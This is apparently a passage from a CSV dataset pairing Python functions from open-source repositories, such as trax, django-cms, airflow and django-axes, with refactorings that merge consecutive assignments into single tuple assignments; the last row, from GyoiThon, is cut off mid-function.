repo_name,file_html,class_name,me_name,me_code,old_code,new_code
Open3D-ML,https://github.com/isl-org/Open3D-ML/tree/master/ml3d/torch/models/kpconv.py,,global_average$863,"def global_average(x, batch_lengths):
    """"""Block performing a global average over batch pooling.

    Args:
        x: [N, D] input features
        batch_lengths: [B] list of batch lengths

    Returns:
        [B, D] averaged features
    """"""
    # Loop over the clouds of the batch
    averaged_features = []
    i0 = 0
    for b_i, length in enumerate(batch_lengths):

        # Average features for each batch cloud
        averaged_features.append(torch.mean(x[i0:i0 + length], dim=0))

        # Increment for next cloud
        i0 += length

    # Average features in each batch
    return torch.stack(averaged_features)","averaged_features = []
i0 = 0","averaged_features , i0  = [], 0"
trax,https://github.com/google/trax/tree/master/trax/tf_numpy/numpy_impl/math_ops.py,,f$765,"def f(a):
    nd = a.shape.rank
    if (axis + nd if axis < 0 else axis) >= nd:
      raise ValueError(""axis %s is out of bounds for array of dimension %s"" %
                       (axis, nd))
    if n < 0:
      raise ValueError(""order must be non-negative but got %s"" % n)
    slice1 = [slice(None)] * nd
    slice2 = [slice(None)] * nd
    slice1[axis] = slice(1, None)
    slice2[axis] = slice(None, -1)
    slice1 = tuple(slice1)
    slice2 = tuple(slice2)
    op = tf.not_equal if a.dtype == tf.bool else tf.subtract
    for _ in range(n):
      a = op(a[slice1], a[slice2])
    return a","slice1 = tuple(slice1)
slice2 = tuple(slice2)
op = tf.not_equal if a.dtype == tf.bool else tf.subtract","slice1 , slice2 , op  = tuple(slice1), tuple(slice2), tf.not_equal if a.dtype == tf.bool else tf.subtract"
text_classification,https://github.com/brightmart/text_classification/tree/master/a04_TextRCNN/p71_TextRCNN_mode2.py,,test$195,"def test():
    #below is a function test; if you use this for text classifiction, you need to tranform sentence to indices of vocabulary first. then feed data to the graph.
    num_classes=10
    learning_rate=0.01
    batch_size=8
    decay_steps=1000
    decay_rate=0.9
    sequence_length=5
    vocab_size=10000
    embed_size=100
    is_training=True
    dropout_keep_prob=1#0.5
    textRNN=TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate,sequence_length,vocab_size,embed_size,is_training)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        for i in range(100):
            input_x=np.zeros((batch_size,sequence_length)) #[None, self.sequence_length]
            input_y=input_y=np.array([1,0,1,1,1,2,1,1]) #np.zeros((batch_size),dtype=np.int32) #[None, self.sequence_length]
            loss,acc,predict,_=sess.run([textRNN.loss_val,textRNN.accuracy,textRNN.predictions,textRNN.train_op],
                                        feed_dict={textRNN.input_x:input_x,textRNN.input_y:input_y,textRNN.dropout_keep_prob:dropout_keep_prob})
            print(""loss:"",loss,""acc:"",acc,""label:"",input_y,""prediction:"",predict)","num_classes = 10
learning_rate = 0.01
batch_size = 8
decay_steps = 1000
decay_rate = 0.9
sequence_length = 5
vocab_size = 10000
embed_size = 100
is_training = True","num_classes , learning_rate , batch_size , decay_steps , decay_rate , sequence_length , vocab_size , embed_size , is_training  = 10, 0.01, 8, 1000, 0.9, 5, 10000, 100, True"
text_classification,https://github.com/brightmart/text_classification/tree/master/a04_TextRCNN/p71_TextRCNN_mode2.py,,test$195,"def test():
    #below is a function test; if you use this for text classifiction, you need to tranform sentence to indices of vocabulary first. then feed data to the graph.
    num_classes=10
    learning_rate=0.01
    batch_size=8
    decay_steps=1000
    decay_rate=0.9
    sequence_length=5
    vocab_size=10000
    embed_size=100
    is_training=True
    dropout_keep_prob=1#0.5
    textRNN=TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate,sequence_length,vocab_size,embed_size,is_training)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        for i in range(100):
            input_x=np.zeros((batch_size,sequence_length)) #[None, self.sequence_length]
            input_y=input_y=np.array([1,0,1,1,1,2,1,1]) #np.zeros((batch_size),dtype=np.int32) #[None, self.sequence_length]
            loss,acc,predict,_=sess.run([textRNN.loss_val,textRNN.accuracy,textRNN.predictions,textRNN.train_op],
                                        feed_dict={textRNN.input_x:input_x,textRNN.input_y:input_y,textRNN.dropout_keep_prob:dropout_keep_prob})
            print(""loss:"",loss,""acc:"",acc,""label:"",input_y,""prediction:"",predict)","dropout_keep_prob = 1
textRNN = TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate, sequence_length, vocab_size, embed_size, is_training)","dropout_keep_prob , textRNN  = 1, TextRCNN(num_classes, learning_rate, batch_size, decay_steps, decay_rate, sequence_length, vocab_size, embed_size, is_training)"
django-cms,https://github.com/django-cms/django-cms/tree/master/cms/tests/test_admin.py,AdminTests,test_change_innavigation$503,"def test_change_innavigation(self):
        page = self.get_page()
        permless = self.get_permless()
        admin_user = self.get_admin()
        with self.login_user_context(permless):
            request = self.get_request()
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 405)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            self.assertRaises(Http404, self.admin_class.change_innavigation,
                              request, page.pk + 100)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            old = page.in_navigation
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 204)
            page = self.reload(page)
            self.assertEqual(old, not page.in_navigation)","page = self.get_page()
permless = self.get_permless()
admin_user = self.get_admin()","page , permless , admin_user  = self.get_page(), self.get_permless(), self.get_admin()"
django-cms,https://github.com/django-cms/django-cms/tree/master/cms/tests/test_admin.py,AdminTests,test_change_innavigation$503,"def test_change_innavigation(self):
        page = self.get_page()
        permless = self.get_permless()
        admin_user = self.get_admin()
        with self.login_user_context(permless):
            request = self.get_request()
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 405)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            self.assertRaises(Http404, self.admin_class.change_innavigation,
                              request, page.pk + 100)
        with self.login_user_context(permless):
            request = self.get_request(post_data={'no': 'data'})
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 403)
        with self.login_user_context(admin_user):
            request = self.get_request(post_data={'no': 'data'})
            old = page.in_navigation
            response = self.admin_class.change_innavigation(request, page.pk)
            self.assertEqual(response.status_code, 204)
            page = self.reload(page)
            self.assertEqual(old, not page.in_navigation)","old = page.in_navigation
response = self.admin_class.change_innavigation(request, page.pk)","old , response  = page.in_navigation, self.admin_class.change_innavigation(request, page.pk)"
airflow,https://github.com/apache/airflow/tree/master/airflow/providers/amazon/aws/operators/dms_stop_task.py,DmsStopTaskOperator,__init__$43,"def __init__(
        self,
        *,
        replication_task_arn: Optional[str] = None,
        aws_conn_id: str = 'aws_default',
        **kwargs,
    ):
        super().__init__(**kwargs)
        self.replication_task_arn = replication_task_arn
        self.aws_conn_id = aws_conn_id","self.replication_task_arn = replication_task_arn
self.aws_conn_id = aws_conn_id","self.replication_task_arn , self.aws_conn_id  = replication_task_arn, aws_conn_id"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","vr = VarianceRatio(self.inflation, debiased=False)
y = self.inflation","vr , y  = VarianceRatio(self.inflation, debiased=False), self.inflation"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","mu = dy.mean()
dy2 = y[2:] - y[:-2]
nq = dy.shape[0]","mu , dy2 , nq  = dy.mean(), y[2:] - y[:-2], dy.shape[0]"
arch,https://github.com/bashtage/arch/tree/master/arch/tests/unitroot/test_unitroot.py,TestUnitRoot,test_variance_ratio$220,"def test_variance_ratio(self):
        vr = VarianceRatio(self.inflation, debiased=False)
        y = self.inflation
        dy = np.diff(y)
        mu = dy.mean()
        dy2 = y[2:] - y[:-2]
        nq = dy.shape[0]
        denom = np.sum((dy - mu) ** 2.0) / nq
        num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)
        ratio = num / denom

        assert_almost_equal(ratio, vr.vr)
        assert ""Variance-Ratio Test"" in str(vr)
        vr = VarianceRatio(self.inflation, debiased=True)
        assert vr.debiased is True","denom = np.sum((dy - mu) ** 2.0) / nq
num = np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)","denom , num  = np.sum((dy - mu) ** 2.0) / nq, np.sum((dy2 - 2 * mu) ** 2.0) / (nq * 2)"
pyro,https://github.com/pyro-ppl/pyro/tree/master/pyro/infer/csis.py,CSIS,_get_matched_trace$161,"def _get_matched_trace(self, model_trace, *args, **kwargs):
        """"""
        :param model_trace: a trace from the model
        :type model_trace: pyro.poutine.trace_struct.Trace
        :returns: guide trace with sampled values matched to model_trace
        :rtype: pyro.poutine.trace_struct.Trace

        Returns a guide trace with values at sample and observe statements
        matched to those in model_trace.

        `args` and `kwargs` are passed to the guide.
        """"""
        kwargs[""observations""] = {}
        for node in itertools.chain(
            model_trace.stochastic_nodes, model_trace.observation_nodes
        ):
            if ""was_observed"" in model_trace.nodes[node][""infer""]:
                model_trace.nodes[node][""is_observed""] = True
                kwargs[""observations""][node] = model_trace.nodes[node][""value""]

        guide_trace = poutine.trace(poutine.replay(self.guide, model_trace)).get_trace(
            *args, **kwargs
        )

        check_model_guide_match(model_trace, guide_trace)
        guide_trace = prune_subsample_sites(guide_trace)

        return guide_trace","model_trace.nodes[node]['is_observed'] = True
kwargs['observations'][node] = model_trace.nodes[node]['value']","model_trace.nodes[node]['is_observed'] , kwargs['observations'][node]  = True, model_trace.nodes[node]['value']"
mobly,https://github.com/google/mobly/tree/master/mobly/controllers/android_device_lib/services/sl4a_service.py,Sl4aService,__init__$28,"def __init__(self, device, configs=None):
    del configs  # Never used.
    self._ad = device
    self._sl4a_client = None","self._ad = device
self._sl4a_client = None","self._ad , self._sl4a_client  = device, None"
django-axes,https://github.com/jazzband/django-axes/tree/master/axes/handlers/database.py,AxesDatabaseHandler,user_login_failed$117,"def user_login_failed(self, sender, credentials: dict, request=None, **kwargs):
        """"""When user login fails, save AccessFailureLog record in database,
        save AccessAttempt record in database, mark request with
        lockout attribute and emit lockout signal.

        """"""

        log.info(""AXES: User login failed, running database handler for failure."")

        if request is None:
            log.error(
                ""AXES: AxesDatabaseHandler.user_login_failed does not function without a request.""
            )
            return

        # 1. database query: Clean up expired user attempts from the database before logging new attempts
        clean_expired_user_attempts(request.axes_attempt_time)

        username = get_client_username(request, credentials)
        client_str = get_client_str(
            username,
            request.axes_ip_address,
            request.axes_user_agent,
            request.axes_path_info,
            request,
        )

        # If axes denied access, don't record the failed attempt as that would reset the lockout time.
        if (
            not settings.AXES_RESET_COOL_OFF_ON_FAILURE_DURING_LOCKOUT
            and request.axes_locked_out
        ):
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )
            return

        # This replaces null byte chars that crash saving failures.
        get_data = get_query_str(request.GET).replace(""\0"", ""0x00"")
        post_data = get_query_str(request.POST).replace(""\0"", ""0x00"")

        if self.is_whitelisted(request, credentials):
            log.info(""AXES: Login failed from whitelisted client %s."", client_str)
            return

        # 2. database query: Get or create access record with the new failure data
        if settings.AXES_ONLY_USER_FAILURES and username is None:
            log.warning(
                ""AXES: Username is None and AXES_ONLY_USER_FAILURES is enabled, new record will NOT be created.""
            )
        else:
            with transaction.atomic():
                (
                    attempt,
                    created,
                ) = AccessAttempt.objects.select_for_update().get_or_create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    defaults={
                        ""get_data"": get_data,
                        ""post_data"": post_data,
                        ""http_accept"": request.axes_http_accept,
                        ""path_info"": request.axes_path_info,
                        ""failures_since_start"": 1,
                        ""attempt_time"": request.axes_attempt_time,
                    },
                )

                # Record failed attempt with all the relevant information.
                # Filtering based on username, IP address and user agent handled elsewhere,
                # and this handler just records the available information for further use.
                if created:
                    log.warning(
                        ""AXES: New login failure by %s. Created new record in the database."",
                        client_str,
                    )

                # 3. database query if there were previous attempts in the database
                # Update failed attempt information but do not touch the username, IP address, or user agent fields,
                # because attackers can request the site with multiple different configurations
                # in order to bypass the defense mechanisms that are used by the site.
                else:
                    separator = ""\n---------\n""

                    attempt.get_data = Concat(""get_data"", Value(separator + get_data))
                    attempt.post_data = Concat(
                        ""post_data"", Value(separator + post_data)
                    )
                    attempt.http_accept = request.axes_http_accept
                    attempt.path_info = request.axes_path_info
                    attempt.failures_since_start = F(""failures_since_start"") + 1
                    attempt.attempt_time = request.axes_attempt_time
                    attempt.save()

                    log.warning(
                        ""AXES: Repeated login failure by %s. Updated existing record in the database."",
                        client_str,
                    )

        # 3. or 4. database query: Calculate the current maximum failure number from the existing attempts
        failures_since_start = self.get_failures(request, credentials)
        request.axes_failures_since_start = failures_since_start

        if (
            settings.AXES_LOCK_OUT_AT_FAILURE
            and failures_since_start >= get_failure_limit(request, credentials)
        ):
            log.warning(
                ""AXES: Locking out %s after repeated login failures."", client_str
            )

            request.axes_locked_out = True
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )

        # 5. database entry: Log for ever the attempt in the AccessFailureLog
        if settings.AXES_ENABLE_ACCESS_FAILURE_LOG:
            with transaction.atomic():
                AccessFailureLog.objects.create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    http_accept=request.axes_http_accept,
                    path_info=request.axes_path_info,
                    attempt_time=request.axes_attempt_time,
                    locked_out=request.axes_locked_out,
                )
                self.remove_out_of_limit_failure_logs(username=username)","get_data = get_query_str(request.GET).replace('\x00', '0x00')
post_data = get_query_str(request.POST).replace('\x00', '0x00')","get_data , post_data  = get_query_str(request.GET).replace('\x00', '0x00'), get_query_str(request.POST).replace('\x00', '0x00')"
django-axes,https://github.com/jazzband/django-axes/tree/master/axes/handlers/database.py,AxesDatabaseHandler,user_login_failed$117,"def user_login_failed(self, sender, credentials: dict, request=None, **kwargs):
        """"""When user login fails, save AccessFailureLog record in database,
        save AccessAttempt record in database, mark request with
        lockout attribute and emit lockout signal.

        """"""

        log.info(""AXES: User login failed, running database handler for failure."")

        if request is None:
            log.error(
                ""AXES: AxesDatabaseHandler.user_login_failed does not function without a request.""
            )
            return

        # 1. database query: Clean up expired user attempts from the database before logging new attempts
        clean_expired_user_attempts(request.axes_attempt_time)

        username = get_client_username(request, credentials)
        client_str = get_client_str(
            username,
            request.axes_ip_address,
            request.axes_user_agent,
            request.axes_path_info,
            request,
        )

        # If axes denied access, don't record the failed attempt as that would reset the lockout time.
        if (
            not settings.AXES_RESET_COOL_OFF_ON_FAILURE_DURING_LOCKOUT
            and request.axes_locked_out
        ):
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )
            return

        # This replaces null byte chars that crash saving failures.
        get_data = get_query_str(request.GET).replace(""\0"", ""0x00"")
        post_data = get_query_str(request.POST).replace(""\0"", ""0x00"")

        if self.is_whitelisted(request, credentials):
            log.info(""AXES: Login failed from whitelisted client %s."", client_str)
            return

        # 2. database query: Get or create access record with the new failure data
        if settings.AXES_ONLY_USER_FAILURES and username is None:
            log.warning(
                ""AXES: Username is None and AXES_ONLY_USER_FAILURES is enabled, new record will NOT be created.""
            )
        else:
            with transaction.atomic():
                (
                    attempt,
                    created,
                ) = AccessAttempt.objects.select_for_update().get_or_create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    defaults={
                        ""get_data"": get_data,
                        ""post_data"": post_data,
                        ""http_accept"": request.axes_http_accept,
                        ""path_info"": request.axes_path_info,
                        ""failures_since_start"": 1,
                        ""attempt_time"": request.axes_attempt_time,
                    },
                )

                # Record failed attempt with all the relevant information.
                # Filtering based on username, IP address and user agent handled elsewhere,
                # and this handler just records the available information for further use.
                if created:
                    log.warning(
                        ""AXES: New login failure by %s. Created new record in the database."",
                        client_str,
                    )

                # 3. database query if there were previous attempts in the database
                # Update failed attempt information but do not touch the username, IP address, or user agent fields,
                # because attackers can request the site with multiple different configurations
                # in order to bypass the defense mechanisms that are used by the site.
                else:
                    separator = ""\n---------\n""

                    attempt.get_data = Concat(""get_data"", Value(separator + get_data))
                    attempt.post_data = Concat(
                        ""post_data"", Value(separator + post_data)
                    )
                    attempt.http_accept = request.axes_http_accept
                    attempt.path_info = request.axes_path_info
                    attempt.failures_since_start = F(""failures_since_start"") + 1
                    attempt.attempt_time = request.axes_attempt_time
                    attempt.save()

                    log.warning(
                        ""AXES: Repeated login failure by %s. Updated existing record in the database."",
                        client_str,
                    )

        # 3. or 4. database query: Calculate the current maximum failure number from the existing attempts
        failures_since_start = self.get_failures(request, credentials)
        request.axes_failures_since_start = failures_since_start

        if (
            settings.AXES_LOCK_OUT_AT_FAILURE
            and failures_since_start >= get_failure_limit(request, credentials)
        ):
            log.warning(
                ""AXES: Locking out %s after repeated login failures."", client_str
            )

            request.axes_locked_out = True
            request.axes_credentials = credentials
            user_locked_out.send(
                ""axes"",
                request=request,
                username=username,
                ip_address=request.axes_ip_address,
            )

        # 5. database entry: Log for ever the attempt in the AccessFailureLog
        if settings.AXES_ENABLE_ACCESS_FAILURE_LOG:
            with transaction.atomic():
                AccessFailureLog.objects.create(
                    username=username,
                    ip_address=request.axes_ip_address,
                    user_agent=request.axes_user_agent,
                    http_accept=request.axes_http_accept,
                    path_info=request.axes_path_info,
                    attempt_time=request.axes_attempt_time,
                    locked_out=request.axes_locked_out,
                )
                self.remove_out_of_limit_failure_logs(username=username)","request.axes_locked_out = True
request.axes_credentials = credentials","request.axes_locked_out , request.axes_credentials  = True, credentials"
pywikibot,https://github.com/wikimedia/pywikibot/tree/master/tests/http_tests.py,CharsetTestCase,test_content_type_application_json_without_charset$386,"def test_content_type_application_json_without_charset(self):
        """"""Test decoding without explicit charset but JSON content.""""""
        charset = None
        resp = CharsetTestCase._create_response(
            headers={'content-type': 'application/json'},
            data=CharsetTestCase.UTF8_BYTES)
        resp.encoding = http._decide_encoding(resp, charset)
        self.assertEqual('utf-8', resp.encoding)","charset = None
resp = CharsetTestCase._create_response(headers={'content-type': 'application/json'}, data=CharsetTestCase.UTF8_BYTES)","charset , resp  = None, CharsetTestCase._create_response(headers={'content-type': 'application/json'}, data=CharsetTestCase.UTF8_BYTES)"
LyricsGenius,https://github.com/johnwmillr/LyricsGenius/tree/master/lyricsgenius/api/api.py,API,annotation$84,"def annotation(self, annotation_id, text_format=None):
        """"""Gets data for a specific annotation.

        Args:
            annotation_id (:obj:`int`): annotation ID
            text_format (:obj:`str`, optional): Text format of the results
                ('dom', 'html', 'markdown' or 'plain').

        Returns:
            :obj:`dict`

        """"""
        params = {'text_format': text_format or self.response_format}
        endpoint = ""annotations/{id}"".format(id=annotation_id)
        return self._make_request(endpoint, params_=params)","params = {'text_format': text_format or self.response_format}
endpoint = 'annotations/{id}'.format(id=annotation_id)","params , endpoint  = {'text_format': text_format or self.response_format}, 'annotations/{id}'.format(id=annotation_id)"
addons,https://github.com/tensorflow/addons/tree/master/tensorflow_addons/layers/crf.py,CRF,add_boundary_energy$217,"def add_boundary_energy(self, potentials, mask, start, end):
        def expand_scalar_to_3d(x):
            # expand tensor from shape (x, ) to (1, 1, x)
            return tf.reshape(x, (1, 1, -1))

        start = tf.cast(expand_scalar_to_3d(start), potentials.dtype)
        end = tf.cast(expand_scalar_to_3d(end), potentials.dtype)
        if mask is None:
            potentials = tf.concat(
                [potentials[:, :1, :] + start, potentials[:, 1:, :]], axis=1
            )
            potentials = tf.concat(
                [potentials[:, :-1, :], potentials[:, -1:, :] + end], axis=1
            )
        else:
            mask = tf.keras.backend.expand_dims(tf.cast(mask, start.dtype), axis=-1)
            start_mask = tf.cast(self._compute_mask_left_boundary(mask), start.dtype)

            end_mask = tf.cast(self._compute_mask_right_boundary(mask), end.dtype)
            potentials = potentials + start_mask * start
            potentials = potentials + end_mask * end
        return potentials","start = tf.cast(expand_scalar_to_3d(start), potentials.dtype)
end = tf.cast(expand_scalar_to_3d(end), potentials.dtype)","start , end  = tf.cast(expand_scalar_to_3d(start), potentials.dtype), tf.cast(expand_scalar_to_3d(end), potentials.dtype)"
qtile,https://github.com/qtile/qtile/tree/master/libqtile/widget/moc.py,Moc,get_info$57,"def get_info(self):
        """"""Return a dictionary with info about the current MOC status.""""""
        try:
            output = self.call_process([""mocp"", ""-i""])
        except subprocess.CalledProcessError as err:
            output = err.output
        if output.startswith(""State""):
            output = output.splitlines()
            info = {""State"": """", ""File"": """", ""SongTitle"": """", ""Artist"": """", ""Album"": """"}

            for line in output:
                for data in info:
                    if data in line:
                        info[data] = line[len(data) + 2 :].strip()
                        break
            return info","output = output.splitlines()
info = {'State': '', 'File': '', 'SongTitle': '', 'Artist': '', 'Album': ''}","output , info  = output.splitlines(), {'State': '', 'File': '', 'SongTitle': '', 'Artist': '', 'Album': ''}"
imgclsmob,https://github.com/osmr/imgclsmob/tree/master/pytorch/pytorchcv/models/isqrtcovresnet.py,,get_isqrtcovresnet$247,"def get_isqrtcovresnet(blocks,
                       conv1_stride=True,
                       model_name=None,
                       pretrained=False,
                       root=os.path.join(""~"", "".torch"", ""models""),
                       **kwargs):
    """"""
    Create iSQRT-COV-ResNet model with specific parameters.

    Parameters:
    ----------
    blocks : int
        Number of blocks.
    conv1_stride : bool, default True
        Whether to use stride in the first or the second convolution layer in units.
    model_name : str or None, default None
        Model name for loading pretrained model.
    pretrained : bool, default False
        Whether to load the pretrained weights for model.
    root : str, default '~/.torch/models'
        Location for keeping the model parameters.
    """"""

    if blocks == 18:
        layers = [2, 2, 2, 2]
    elif blocks == 34:
        layers = [3, 4, 6, 3]
    elif blocks == 50:
        layers = [3, 4, 6, 3]
    elif blocks == 101:
        layers = [3, 4, 23, 3]
    elif blocks == 152:
        layers = [3, 8, 36, 3]
    elif blocks == 200:
        layers = [3, 24, 36, 3]
    else:
        raise ValueError(""Unsupported iSQRT-COV-ResNet with number of blocks: {}"".format(blocks))

    init_block_channels = 64
    final_block_channels = 256

    if blocks < 50:
        channels_per_layers = [64, 128, 256, 512]
        bottleneck = False
    else:
        channels_per_layers = [256, 512, 1024, 2048]
        bottleneck = True

    channels = [[ci] * li for (ci, li) in zip(channels_per_layers, layers)]

    net = iSQRTCOVResNet(
        channels=channels,
        init_block_channels=init_block_channels,
        final_block_channels=final_block_channels,
        bottleneck=bottleneck,
        conv1_stride=conv1_stride,
        **kwargs)

    if pretrained:
        if (model_name is None) or (not model_name):
            raise ValueError(""Parameter `model_name` should be properly initialized for loading pretrained model."")
        from .model_store import download_model
        download_model(
            net=net,
            model_name=model_name,
            local_model_store_dir_path=root)

    return net","init_block_channels = 64
final_block_channels = 256","init_block_channels , final_block_channels  = 64, 256"
imgclsmob,https://github.com/osmr/imgclsmob/tree/master/pytorch/pytorchcv/models/isqrtcovresnet.py,,get_isqrtcovresnet$247,"def get_isqrtcovresnet(blocks,
                       conv1_stride=True,
                       model_name=None,
                       pretrained=False,
                       root=os.path.join(""~"", "".torch"", ""models""),
                       **kwargs):
    """"""
    Create iSQRT-COV-ResNet model with specific parameters.

    Parameters:
    ----------
    blocks : int
        Number of blocks.
    conv1_stride : bool, default True
        Whether to use stride in the first or the second convolution layer in units.
    model_name : str or None, default None
        Model name for loading pretrained model.
    pretrained : bool, default False
        Whether to load the pretrained weights for model.
    root : str, default '~/.torch/models'
        Location for keeping the model parameters.
    """"""

    if blocks == 18:
        layers = [2, 2, 2, 2]
    elif blocks == 34:
        layers = [3, 4, 6, 3]
    elif blocks == 50:
        layers = [3, 4, 6, 3]
    elif blocks == 101:
        layers = [3, 4, 23, 3]
    elif blocks == 152:
        layers = [3, 8, 36, 3]
    elif blocks == 200:
        layers = [3, 24, 36, 3]
    else:
        raise ValueError(""Unsupported iSQRT-COV-ResNet with number of blocks: {}"".format(blocks))

    init_block_channels = 64
    final_block_channels = 256

    if blocks < 50:
        channels_per_layers = [64, 128, 256, 512]
        bottleneck = False
    else:
        channels_per_layers = [256, 512, 1024, 2048]
        bottleneck = True

    channels = [[ci] * li for (ci, li) in zip(channels_per_layers, layers)]

    net = iSQRTCOVResNet(
        channels=channels,
        init_block_channels=init_block_channels,
        final_block_channels=final_block_channels,
        bottleneck=bottleneck,
        conv1_stride=conv1_stride,
        **kwargs)

    if pretrained:
        if (model_name is None) or (not model_name):
            raise ValueError(""Parameter `model_name` should be properly initialized for loading pretrained model."")
        from .model_store import download_model
        download_model(
            net=net,
            model_name=model_name,
            local_model_store_dir_path=root)

    return net","channels_per_layers = [64, 128, 256, 512]
bottleneck = False","channels_per_layers , bottleneck  = [64, 128, 256, 512], False"
Paddle,https://github.com/PaddlePaddle/Paddle/tree/master/python/paddle/fluid/tests/unittests/test_affine_channel_op.py,,affine_channel$24,"def affine_channel(x, scale, bias, layout):
    C = x.shape[1] if layout == 'NCHW' else x.shape[-1]
    if len(x.shape) == 4:
        new_shape = (1, C, 1, 1) if layout == 'NCHW' else (1, 1, 1, C)
    else:
        new_shape = (1, C)
    scale = scale.reshape(new_shape)
    bias = bias.reshape(new_shape)
    return x * scale + bias","scale = scale.reshape(new_shape)
bias = bias.reshape(new_shape)","scale , bias  = scale.reshape(new_shape), bias.reshape(new_shape)"
PyPtt,https://github.com/PttCodingMan/PyPtt/tree/master/PyPtt/_api_get_user.py,,parse_user_page$21,"def parse_user_page(screen):
    lines = screen.split('\n')[1:]
    # print(' =>' + '\n =>'.join(lines))

    result = list()
    for i, line in enumerate(lines):
        if i == 0:
            line = line[6:]
            # print(f' ==> [{line}]')
            result_buffer = line[:26].strip()
            result.append(result_buffer)
            # print(f' ==> [{result_buffer}]')
            line = line[line.find(result_buffer) + len(result_buffer):].strip()
            result_buffer = line[6:]
            result.append(result_buffer)
            # print(f' ==> [{result_buffer}]')
        elif i == 1:
            line = line[6:]
            # print(f' ==> [{line}]')
            result_buffer = line[:line.find('《')].strip()
            buffer = result_buffer.split(' ')[0]
            # print(f' ==> [{buffer}]')
            result.append(buffer)
            line = line[line.find(result_buffer) + len(result_buffer):].strip()
            result_buffer = line[6:]
            # print(f' ==> [{result_buffer}]')
            result.append(result_buffer)
        elif i == 2 or i == 3 or i == 4:
            line = line[line.find('》') + 1:]
            # print(f' ==> [{line}]')
            result_buffer = line[:line.find('《')].strip()
            result.append(result_buffer)
            line = line[line.find(result_buffer) + len(result_buffer):].strip()
            # print(f' ==> [{line}]')
            result_buffer = line[6:].strip()
            # print(f' ==> [{result_buffer}]')
            result.append(result_buffer)

    return result","lines = screen.split('\n')[1:]
result = list()","lines , result  = screen.split('\n')[1:], list()"
parsedatetime,https://github.com/bear/parsedatetime/tree/master/tests/TestSimpleOffsets.py,test,testRightNow$52,"def testRightNow(self):
        s = datetime.datetime.now()

        start = s.timetuple()
        target = s.timetuple()

        self.assertExpectedResult(
            self.cal.parse('right now', start),
            (target, pdtContext(pdtContext.ACU_NOW)))","start = s.timetuple()
target = s.timetuple()","start , target  = s.timetuple(), s.timetuple()"
GyoiThon,https://github.com/gyoisamurai/GyoiThon/tree/master/modules/Gyoi_Inventory.py,Inventory,sub_domain_explore$410,"def sub_domain_explore(self, domain_info_dict, google_hack):
        self.utility.print_message(NOTE, 'Explore sub-domain.')
        msg = self.utility.make_log_msg(self.utility.log_in,
                                        self.utility.log_dis,
                                        self.file_name,
                                        action=self.action_name,
                                        note='Explore sub-domain.',
                                        dest=self.utility.target_host)
        self.utility.write_log(20, msg)

        # Get whois information for mutated domain.
        for idx, domain in enumerate(domain_info_dict.keys()):
            self.utility.print_message(OK, '[{}/{}] Sub-domain Explore of ""{}""'.format(idx + 1, len(domain_info_dict), domain))
            if self.check_existing_tmp_json(domain):
                self.utility.print_message(WARNING, 'Existing temporary Json file for ""{}"".'.format(domain))
                continue

            # Add domain to sub-domain list.
            sub_domain_info_dict = {}
            sub_domain_info_dict[domain] = {'IP Address': domain_info_dict[domain]['IP Address'],
                                            'DNS': domain_info_dict[domain]['DNS'],
                                            'Access Status': 'N/A'}

            # Explore sub-domain using Google Custom Search.
